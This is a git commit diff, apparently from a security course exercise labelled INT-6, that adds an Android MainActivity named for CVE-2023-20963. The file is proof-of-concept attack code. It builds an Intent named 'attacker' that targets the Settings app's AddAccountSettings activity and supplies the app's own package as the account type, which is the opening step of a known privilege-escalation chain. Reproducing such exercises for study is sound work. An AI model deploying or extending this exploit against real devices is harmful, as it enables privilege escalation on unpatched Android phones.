a9ce80524a5e1b308d2d77768c4791930bccb173
cr3at1v3annis <test@test.com>
2024-11-07 17:55:55 +0300

    addaed solutions for INT-6

---
+++ CVE_2023_20963/app/src/main/java/com/example/cve_2023_20963/MainActivity.java
@@ -0,0 +1,28 @@
+package com.example.cve_2023_20963;
+import static android.content.ContentValues.TAG;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.ComponentName;
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.Parcel;
+import android.util.Log;
+
+public class  MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        Intent attacker = new Intent();
+        attacker.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
+        attacker.setAction(Intent.ACTION_RUN);
+        attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        String[] authTypes = {"com.example.cve_2023_20963"};
+        attacker.putExtra("account_types", authTypes);
+        startActivity(attacker);
+
+    }
+
+}
